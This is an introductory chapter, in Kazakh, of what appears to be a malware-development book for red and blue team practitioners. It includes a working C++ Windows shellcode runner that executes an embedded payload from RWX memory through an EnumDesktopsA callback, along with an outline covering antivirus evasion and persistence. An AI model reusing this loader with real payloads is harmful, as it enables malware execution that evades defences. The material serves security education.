\newpage
\subsection{2. зиянды бағдарламаны әзірлеу дегеніміз не?}\label{2. зиянды бағдарламаны әзірлеу дегеніміз не?}

﷽

Red Team немесе Blue Team маманы болсаңыз да, зиянды бағдарламаларды әзірлеу әдістері мен айла-амалдарын үйрену сізге жетілдірілген шабуылдардың толық көрінісін береді. Сонымен қатар, классикалық зиянды бағдарламалардың көпшілігі әдетте Windows жүйесінде жазылады, бұл сізге Windows операциялық жүйесіне арналған бағдарламаларды әзірлеуде практикалық білім береді.     

Бұл кітаптағы оқу құралдар мен мысалдардың көпшілігі `Python` және `C/C++` бағдарламалау тілдерін терең түсінуді талап етеді:    

```cpp
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

int main() {
  unsigned char my_payload[] =
  "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
  "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
  "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
  "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
  "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
  "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
  "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
  "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
  "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
  "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
  "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
  "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
  "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
  "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
  "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
  "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
  "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
  "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
  "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
  "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
  "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
  "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
  "\x2e\x2e\x5e\x3d\x00";

  LPVOID mem = VirtualAlloc(NULL, sizeof(my_payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(mem, my_payload, sizeof(my_payload));
  EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, (LPARAM)NULL);
  return 0;
}
```

Кейде бізге Nim бағдарламалау тіліндегі кейбір кодты түсіну де қажет:    

```python
import strutils

proc caesar(s: string, k: int, decode = false): string =
  var k = if decode: 26 - k else: k
  result = ""
  for i in toUpper(s):
    if ord(i) >= 65 and ord(i) <= 90:
      result.add(chr((ord(i) - 65 + k) mod 26 + 65))

let msg = "The quick brown fox jumped over the lazy dogs"
echo msg
let enc = caesar(msg, 11)
echo enc
echo caesar(enc, 11, decode = true)
```

Негізі логикалық тұрғыдан кітап бес (4 + 1 бонус) тарауға бөлінеді:
- Зиянды бағдарлаларды жазудың түрлі айла-амалдары мен әдістері     
- Антивирусты (AV) алдау амалдары    
- Табандылық техникалары     
- Зиянды бағдарлама, криптография және зерттеулер      
- Linux зиянды бағдарламаларын әзірлеуге кіріспе      

Кітаптағы барлық материалдар менің [блогымдағы](https://cocomelonc.github.io/) жазбалардан негізделген.    

Сұрақтарыңыз болса, менің [элетронды поштам](mailto:cocomelonkz@gmail.com) арқылы қоюға болады    

Менің Github репозиториям: [https://github.com/cocomelonc](https://github.com/cocomelonc)    